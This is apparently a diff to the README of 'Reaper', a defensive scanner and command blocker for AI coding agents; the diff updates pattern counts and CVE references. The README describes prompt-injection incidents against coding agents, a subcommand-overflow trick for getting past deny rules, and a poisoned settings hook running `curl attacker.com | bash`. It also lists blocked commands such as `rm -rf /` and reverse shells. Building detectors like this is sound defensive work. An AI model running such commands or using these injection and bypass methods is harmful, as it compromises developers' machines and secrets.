@@ -3,7 +3,7 @@
 <p>
   <a href="LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-3fb950?style=for-the-badge"></a>
   <img alt="5 plugins" src="https://img.shields.io/badge/Plugins-5-bc8cff?style=for-the-badge">
-  <img alt="2,011 security patterns" src="https://img.shields.io/badge/Patterns-2,011-58a6ff?style=for-the-badge">
+  <img alt="1,844 security patterns" src="https://img.shields.io/badge/Patterns-1%2C844-58a6ff?style=for-the-badge">
   <img alt="98 CWEs covered" src="https://img.shields.io/badge/CWEs-98-d29922?style=for-the-badge">
   <img alt="Zero dependencies (bash plus jq)" src="https://img.shields.io/badge/Deps-0-f85149?style=for-the-badge">
   <a href="https://www.repostatus.org/#active"><img alt="Project Status: Active" src="https://www.repostatus.org/badges/latest/active.svg"></a>
@@ -11,7 +11,7 @@
 
 > **An @enchanted-plugins product — algorithm-driven, agent-managed, self-learning.**
 
-**5 plugins. 5 agents. 2,011 patterns. 8 algorithms. 98 CWEs. 20 attack databases. Zero dependencies.**
+**5 plugins. 5 agents. 1,844 patterns. 8 algorithms. 98 CWEs. 20 attack databases. Zero dependencies.**
 
 Built from blood — every pattern traces back to a real CVE, a real breach, or a real research paper.
 
@@ -59,7 +59,7 @@ Not for:
 - [The Full Lifecycle](#the-full-lifecycle)
 - [Install](#install)
 - [Quickstart](#quickstart)
-- [5 Plugins, 5 Agents, 2,011 Patterns](#5-plugins-5-agents-2011-patterns)
+- [5 Plugins, 5 Agents, 1,844 Patterns](#5-plugins-5-agents-1844-patterns)
 - [What You Get Per Session](#what-you-get-per-session)
 - [Roadmap](#roadmap)
 - [The Science Behind Reaper](#the-science-behind-reaper)
@@ -79,7 +79,7 @@ Not for:
 | | Count |
 |---|---|
 | **Pattern databases** | 20 |
-| **Security patterns** | 2,011 |
+| **Security patterns** | 1,844 |
 | **CWEs covered** | 98 |
 | **CVEs referenced** | 30+ |
 | **Attack categories** | 120+ |
@@ -100,8 +100,8 @@ Every pattern exists because something real happened to a real developer.
 | Year | Incident | Impact | Reaper Coverage |
 |------|----------|--------|-----------------|
 | 2025 | **Clinejection** — prompt injection in GitHub Issue titles led to `npm publish` of malicious packages | Supply chain compromise | `cicd-attacks.json` — 130 CI/CD injection patterns |
-| 2025 | **CamoLeak** — invisible prompt in PR description exfiltrated secrets via GitHub Camo proxy | Credential theft (CVE-2025-59145) | `ai-agent-attacks.json` — 110 AI/LLM attack patterns |
-| 2025 | **Check Point hooks exploit** — `.claude/settings.json` ran reverse shell on repo clone | RCE (CVE-2025-59536) | `config-attacks.json` — 117 config poisoning signatures |
+| 2025 | **CamoLeak** — invisible prompt in PR description exfiltrated secrets via GitHub Camo proxy | Credential theft (CVE-2025-59145) | `ai-agent-attacks.json` — 116 AI/LLM attack patterns |
+| 2025 | **Check Point hooks exploit** — `.claude/settings.json` ran reverse shell on repo clone | RCE (CVE-2025-59536) | `config-attacks.json` — 122 config poisoning signatures (incl. CVE-2026-33068, CVE-2026-35022) |
 | 2025 | **MCP server SSRF** — 36.7% of 7,000 MCP servers vulnerable | Internal network pivoting | `ssrf-patterns.json` — 61 SSRF detection patterns |
 | 2024 | **Leaky Vessels** — runc container escape via build-time race condition | Host filesystem access (CVE-2024-21626) | `container-security.json` — 113 container patterns |
 | 2024 | **xz-utils backdoor** — nation-state supply chain attack on liblzma | SSH compromise (CVE-2024-3094) | `dependency-confusion.json` — 50 supply chain patterns |
@@ -116,7 +116,7 @@ Every pattern exists because something real happened to a real developer.
 
 Reaper doesn't scan after the fact. It **intercepts** — before secrets hit disk, before dangerous commands execute, before malicious configs load.
 
-At **SessionStart**, config-shield scans repo configs for CVE-matched attack signatures (R5). **PreToolUse** on Bash routes through action-guard, which classifies the command against 105 dangerous-op patterns (R4) and blocks any command with >50 subcommand separators (R7, exit 2). **PostToolUse** on Write/Edit runs secret-scanner (R1 Aho-Corasick + R2 Shannon entropy) and vuln-detector (R3 OWASP graph) in parallel. audit-trail logs every event and drives R8 Bayesian threat-posture EMA across sessions. The diagram below shows the bindings.
+At **SessionStart**, config-shield scans repo configs for CVE-matched attack signatures (R5). **PreToolUse** on Bash routes through action-guard, which classifies the command against 113 dangerous-op patterns (R4) and blocks any command with >50 subcommand separators (R7, exit 2). **PostToolUse** on Write/Edit runs secret-scanner (R1 Aho-Corasick + R2 Shannon entropy) and vuln-detector (R3 OWASP graph) in parallel. audit-trail logs every event and drives R8 Bayesian threat-posture EMA across sessions. The diagram below shows the bindings.
 
 <p align="center">
   <a href="docs/assets/pipeline.mmd" title="View hook-binding diagram source (Mermaid)">
@@ -162,7 +162,7 @@ Three strictness modes:
 
 **Config poisoning** (R5): Scans for malicious config files on session start — `.claude/settings.json` with hooks that execute `curl attacker.com | bash`, `.claudecode/settings.json` stealing API keys, `.vscode/tasks.json` auto-executing on folder open. Real CVEs that no other tool detects.
 
-**AI agent attacks**: 110 patterns for prompt injection, MCP tool poisoning, invisible Unicode in rules files, data exfiltration via image markdown, jailbreak detection, and rules file backdoors. Built for the age of coding agents.
+**AI agent attacks**: 116 patterns for prompt injection, MCP tool poisoning (incl. rug-pull descriptor mutation + schema `$ref` remote-load + homoglyph tool-name spoofing), invisible Unicode in rules files, markdown-image exfiltration (CamoLeak CVE-2025-59145), ANSI-escape output smuggling, jailbreak detection, and rules file backdoors. Built for the age of coding agents.
 
 **Subcommand overflow** (R7): Adversa AI discovered that commands with 50+ subcommands bypass deny rules. Reaper counts first, matches second.
 
@@ -235,16 +235,16 @@ Install, scan the repo, read the findings. Sixty seconds:
 /reaper:vulns
 ```
 
-Expected: `/reaper:config-check` flags poisoned `.claude/settings.json` hooks, suspicious MCP servers, and `.cursorrules` obfuscations matched against 117 signatures. `/reaper:vulns` reports OWASP + CWE findings across the working tree with severity and suggested remediation. Both are advisory; every event lands in `/reaper:audit`. See [docs/getting-started.md](docs/getting-started.md) for the full guided first run.
+Expected: `/reaper:config-check` flags poisoned `.claude/settings.json` hooks, suspicious MCP servers, and `.cursorrules` obfuscations matched against 122 signatures. `/reaper:vulns` reports OWASP + CWE findings across the working tree with severity and suggested remediation. Both are advisory; every event lands in `/reaper:audit`. See [docs/getting-started.md](docs/getting-started.md) for the full guided first run.
 
-## 5 Plugins, 5 Agents, 2,011 Patterns
+## 5 Plugins, 5 Agents, 1,844 Patterns
 
 | Plugin | Command | What | Agent |
 |--------|---------|------|-------|
-| secret-scanner | `/reaper:secrets` | 310 secret patterns + entropy analysis | scanner (Haiku) |
-| vuln-detector | `/reaper:vulns` | 1,701 vulnerability patterns across 98 CWEs | analyzer (Sonnet) |
-| action-guard | `/reaper:safety` | 105 dangerous ops, command blocking | guardian (Sonnet) |
-| config-shield | `/reaper:config-check` | 117 config attack signatures, 6 CVEs | inspector (Sonnet) |
+| secret-scanner | `/reaper:secrets` | 319 secret patterns + entropy analysis | scanner (Haiku) |
+| vuln-detector | `/reaper:vulns` | 1,525 vulnerability patterns across 98 CWEs | analyzer (Sonnet) |
+| action-guard | `/reaper:safety` | 113 dangerous ops, command blocking | guardian (Sonnet) |
+| config-shield | `/reaper:config-check` | 122 config attack signatures, 8 CVEs | inspector (Sonnet) |
 | audit-trail | `/reaper:audit` | JSONL logging, HTML reports, self-learning | chronicler (Haiku) |
 
 ## What You Get Per Session
@@ -317,13 +317,13 @@ Language-aware CWE pattern matching. Comment detection reduces false positives. 
 
 <p align="center"><img src="docs/assets/math/r4-block.svg" alt="BLOCK iff cmd is in the dangerous-op set or has more than 50 subcommands"></p>
 
-State-machine classification against 105 dangerous command patterns. Exit 2 blocks execution.
+State-machine classification against 113 dangerous command patterns. Exit 2 blocks execution.
 
 ### R5: Config Poisoning Detection
 
 <p align="center"><img src="docs/assets/math/r5-poison.svg" alt="Poisoned(c) iff some CVE signature matches the contents of c"></p>
 
-117 attack signatures across 30+ config file types. Base64 payload decoding. Hidden Unicode detection.
+122 attack signatures across 30+ config file types. Base64 payload decoding. Hidden Unicode detection.
 
 ### R6: Phantom Dependency Detection
 
@@ -351,14 +351,14 @@ Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns es
 
 ## The 20 Pattern Databases
 
-### Threat Intelligence (2,011 patterns across 20 databases)
+### Threat Intelligence (1,844 patterns across 20 databases)
 
 | Database | Patterns | What it detects |
 |----------|----------|-----------------|
-| **secrets.json** | 310 | AWS, GCP, Azure, OpenAI, Anthropic, GitHub, GitLab, Stripe, Slack, JWT, private keys, connection strings — 80+ providers |
+| **secrets.json** | 319 | AWS, GCP, Azure, OpenAI (+sk-proj, +sk-svcacct), Anthropic (+admin01), xAI, LangSmith, LangFuse, Pinecone v2, Supabase v2, NVIDIA NGC, Together AI, HF, GitHub, GitLab, Stripe, Slack, JWT, private keys, connection strings — 90+ providers |
 | **vulns.json** | 156 | SQL injection, XSS, path traversal, command injection, SSRF, deserialization, CORS, insecure random, SSTI — OWASP Top 10 |
-| **dangerous-ops.json** | 105 | `rm -rf /`, `DROP TABLE`, `curl\|bash`, reverse shells, K8s delete, Docker privileged, Terraform destroy |
-| **config-attacks.json** | 117 | CVE-2025-59536, CVE-2026-21852, CVE-2025-54135 — .claude hooks, .vscode autorun, .npmrc hijack, hidden Unicode |
+| **dangerous-ops.json** | 113 | `rm -rf /`, `DROP TABLE`, `curl\|bash`, base64-decode exec, reverse shells, K8s delete, Docker privileged, Terraform destroy, untrusted `npx`/`uvx`/`claude mcp add` launchers, `.claude/settings.json` direct writes |
+| **config-attacks.json** | 122 | CVE-2025-59536, CVE-2025-54135, CVE-2026-21852, CVE-2026-33068 (`bypassPermissions`), CVE-2026-35022 (`apiKeyHelper` shell injection) — .claude hooks, .vscode autorun, .npmrc hijack, .mcp.json inline shell, hidden Unicode |
 | **slopsquatting.json** | 199 | AI-hallucinated packages across npm, PyPI, Cargo, Go, RubyGems + Levenshtein typosquats |
 | **cicd-attacks.json** | 130 | GitHub Actions `${{ }}` injection, `pull_request_target` abuse, Jenkins Groovy escape, GitLab CI dind, Azure DevOps variable injection |
 | **container-security.json** | 113 | Dockerfile USER root, K8s privileged containers, hostNetwork, capabilities ALL, Helm secrets, docker-compose socket mounts |
@@ -367,7 +367,7 @@ Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns es
 | **auth-bypass.json** | 80 | JWT alg:none, session fixation, CSRF disabled, OAuth missing state, mass assignment, IDOR patterns |
 | **ssrf-patterns.json** | 61 | Cloud metadata (AWS/GCP/Azure/Alibaba), localhost bypass (hex/octal/IPv6), scheme abuse (gopher/file/dict), user-URL fetch |
 | **api-security.json** | 81 | GraphQL introspection, no rate limit on login, CORS reflect origin, WebSocket no auth, gRPC no TLS |
-| **ai-agent-attacks.json** | 110 | Prompt injection, MCP tool poisoning, CamoLeak exfiltration, jailbreaks, rules file backdoors, invisible Unicode |
+| **ai-agent-attacks.json** | 116 | Prompt injection, 18 MCP patterns (poisoning, shadowing, rug-pull descriptor mutation, schema `$ref` remote-load, name homoglyph), CamoLeak markdown-image exfil, ANSI-escape output smuggling, jailbreaks, rules file backdoors, invisible Unicode |
 | **regex-dos.json** | 44 | Nested quantifiers `(a+)+`, overlapping alternation, evil email regex, `new RegExp(userInput)` |
 | **deserialization.json** | 69 | Java ObjectInputStream, Python pickle, PHP unserialize, Ruby Marshal, .NET BinaryFormatter, Node serialize |
 | **file-operations.json** | 50 | Zip slip, symlink race, TOCTOU, predictable temp files, upload without validation, LFI/RFI |
@@ -380,24 +380,24 @@ Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns es
 
 | Attack Surface | Databases | Combined Patterns |
 |----------------|-----------|-------------------|
-| **Secrets & credentials** | secrets, crypto-weakness | 400 |
+| **Secrets & credentials** | secrets, crypto-weakness | 409 |
 | **Code vulnerabilities** | vulns, deserialization, file-operations, regex-dos, prototype-pollution, logging-forgery | 395 |
 | **Infrastructure** | container-security, iac-misconfig, header-security | 283 |
 | **CI/CD & supply chain** | cicd-attacks, dependency-confusion, slopsquatting | 379 |
 | **Auth & API** | auth-bypass, ssrf-patterns, api-security | 222 |
-| **AI/LLM agent** | ai-agent-attacks, config-attacks | 227 |
-| **Dangerous commands** | dangerous-ops | 105 |
+| **AI/LLM agent** | ai-agent-attacks, config-attacks | 238 |
+| **Dangerous commands** | dangerous-ops | 113 |
 
 ## vs Everything Else
 
 | | Reaper | GitHub Secret Scanning | Snyk | semgrep | GitGuardian |
 |---|---|---|---|---|---|
-| Patterns | **2,011** | ~200 | ~1,000 | ~2,500 (rules) | ~400 |
+| Patterns | **1,844** | ~200 | ~1,000 | ~2,500 (rules) | ~400 |
 | CWE coverage | **98 CWEs** | Secrets only | Varies | Varies | Secrets only |
 | Scan timing | **Per-write** (real-time) | Push-time | CI pipeline | CI pipeline | Push-time |
 | Command blocking | **PreToolUse exit 2** | — | — | — | — |
-| Config poisoning | **117 signatures, 6 CVEs** | — | — | — | — |
-| AI agent attacks | **110 patterns** | — | — | — | — |
+| Config poisoning | **122 signatures, 8 CVEs** | — | — | — | — |
+| AI agent attacks | **116 patterns** | — | — | — | — |
 | CI/CD injection | **130 patterns** | — | — | Partial | — |
 | Container security | **113 patterns** | — | ✓ | ✓ | — |
 | IaC scanning | **120 patterns** | — | ✓ | Partial | — |
@@ -460,7 +460,7 @@ Reaper builds on foundations laid by others:
 - **[Citation File Format](https://citation-file-format.github.io/)** — citation metadata.
 - **[Conventional Commits](https://www.conventionalcommits.org/)** — commit convention.
 
-Every one of the 2,011 patterns traces back to a real CVE, research paper, or breach writeup; the audit trail records these references per-finding.
+Every one of the 1,844 patterns traces back to a real CVE, research paper, or breach writeup; the audit trail records these references per-finding.
 
 ## Versioning & release cadence
 
